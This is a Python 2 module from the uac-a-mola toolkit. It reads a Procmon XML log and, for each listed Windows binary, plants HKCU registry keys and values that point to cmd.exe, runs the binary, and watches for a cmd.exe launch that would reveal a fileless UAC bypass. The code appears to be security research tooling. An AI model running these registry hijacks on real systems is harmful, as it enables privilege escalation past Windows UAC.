# This file is part of uac-a-mola
# Copyright (C) Santiago Hernandez Ramos <shramos@protonmail.com>
#
# DESCRIPTION
# This file parses an xml produced by Procmon application and returns
# a list of binaries that are vulnerable to fileless uac bypass


from module import Module
from support.procmonXMLparser import ProcmonXmlParser
from support.winreg import Registry
import support.procmonXMLfilter as Filter
from _winreg import HKEY_CURRENT_USER as HKCU
import subprocess
import psutil
import copy
import time


class CustomModule(Module):
    _FORBIDDEN_PATHS = ('HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\SessionInfo\1\Desktop\NameSpace\DelegateFolders',
                       'HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\SessionInfo\1\MyComputer\RemovableDrives',
                       'HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\SessionInfo\1\KnownFolders',
                       'HKCU\Control Panel\Desktop\MuiCached\MachineLanguageConfiguration')
    def __init__(self):
        information = {"Name": "Fileless discovery",
                       "Description": "This module search in a list of binaries for fileless UAC bypasses",
                       "Author": "Santiago Hernandez Ramos"}

        # -----------name-----default_value--description
        options = {"binlist": ["binlist.txt", "Path to a list of binaries for testing", True],
                   "xml_file": ["results.xml", "Path to a procmon like XML file", True],
                   "sleep_time": [1, "Time between execution of the binary", False]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

        # Class atributes, initialization in the run_module method
        # after the user has set the values
        self._results = {}
        self.p = None
        self.events = None
        self.events_nf = None
        self.reg = None
	self._visited = []

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        self.init_import_modules()
	try:
            self.print_info("[*] Searching for openkey not found values\n")
            for b in self.binaries():
	        self._visited = []
                self._results[b] = []
                self.print_ok("[*] Processing %s\n" % b)
                events = copy.deepcopy(self.p)
                events = Filter.by_process(events, b)
                events = Filter.by_operation(events, "RegOpenKey")
                for e in events['RegOpenKey']:
                    path = e.find('Path').text
		    if path in self._visited or path in self._FORBIDDEN_PATHS:
                        continue
                    self._visited.append(path)
                    self.print_info("[*] Inserting into %s" % path)
                    k = self.reg.create_key(HKCU, "\\".join(path.split("\\")[1:]))
                    self.reg.set_value(HKCU, "\\".join(
                        path.split("\\")[1:]), "C:\\Windows\\System32\\cmd.exe")
                    previous_pid = psutil.pids()
                    self.execute(b)
                    time.sleep(int(self.args["sleep_time"]))
                    new_pid = psutil.pids()
                    if self.is_cmd_open(previous_pid):
                        if str(path) not in self._results[b]:
                            self._results[b].append(str(path))
                        self.kill('cmd', previous_pid, new_pid)
                    else:
                        self.kill(b.split('.')[0], previous_pid, new_pid)
                    self.reg.restore(k)
        except:
            self.print_ko("Exiting the module\n")
            self.results()
	    return

        #########################################################

	try:
            self.print_info("[*] Searching for queryvalue not found values\n")
            for b in self.binaries():
                self._visited = []
                self.print_ok("[*] Processing %s\n" % b)
                events = copy.deepcopy(self.p)
                events = Filter.by_process(events, b)
                events = Filter.by_operation(events, "RegQueryValue")
                for e in events['RegQueryValue']:
                    path = e.find('Path').text
		    if path in self._visited or path in self._FORBIDDEN_PATHS:
                        continue
                    self._visited.append(path)
                    self.print_info("[*] Inserting into %s" % str(path))
                    k = self.reg.create_key(
                        HKCU, "\\".join(path.split("\\")[1:-1]))
                    self.reg.create_value(k, path.split(
                        "\\")[-1], "C:\\Windows\\System32\\cmd.exe")

                    previous_pid = psutil.pids()
                    self.execute(b)
                    time.sleep(int(self.args["sleep_time"]))
                    new_pid = psutil.pids()

                    if self.is_cmd_open(previous_pid):
                        if str(path) not in self.results[b]:
                            self._results[b].append(str(path))
                        self.kill('cmd', previous_pid, new_pid)
                    else:
                        self.kill(b.split('.')[0], previous_pid, new_pid)

                    self.reg.restore(k, path.split("\\")[-1])
        except:
	    self.print_ko("Exiting the module\n")
            self.results()
            return

        self.results()

    def init_import_modules(self):
        parser = ProcmonXmlParser(self.args["xml_file"])
        self.p = parser.parse()
        self.reg = Registry()

    def results(self):
        print "\n"
        self.print_info("RESULTS\n")
        print "-------"

        for key in self._results.keys():
            self.print_info(key + '\n')
            for v in self._results[key]:
                print "|_" + v
        print ""

    def kill(self, proc, last_pids=None, new_pids=None):
        new_pids = self.last_process_created(last_pids, new_pids)
        try:
            for p in new_pids:
                subprocess.check_call(["taskkill","/t", "/f", "/pid", str(p)])
        except subprocess.CalledProcessError:
            print "[!!] The process %s can't be killed" % proc
            return

    def last_process_created(self, prev_pids, new_pids):
        pids = []
        for p in new_pids:
            if p not in prev_pids:
                pids.append(p)
        return pids

    def execute(self, proc):
        try:
            subprocess.Popen([proc])
        except subprocess.CalledProcessError as error:
            raise error
        except WindowsError:
            print "[!!] The application can't be executed in win32 mode"
            return

    def is_cmd_open(self, prev_pids):
        created_pids = []
        for pid in psutil.pids():
            if pid not in prev_pids:
                created_pids.append(pid)
        try:
            return 'cmd.exe' in [psutil.Process(p).name() for p in created_pids]
        except:
            pass

    def binaries(self):
        with open(self.args["binlist"], 'r') as binfile:
            return binfile.read().splitlines()
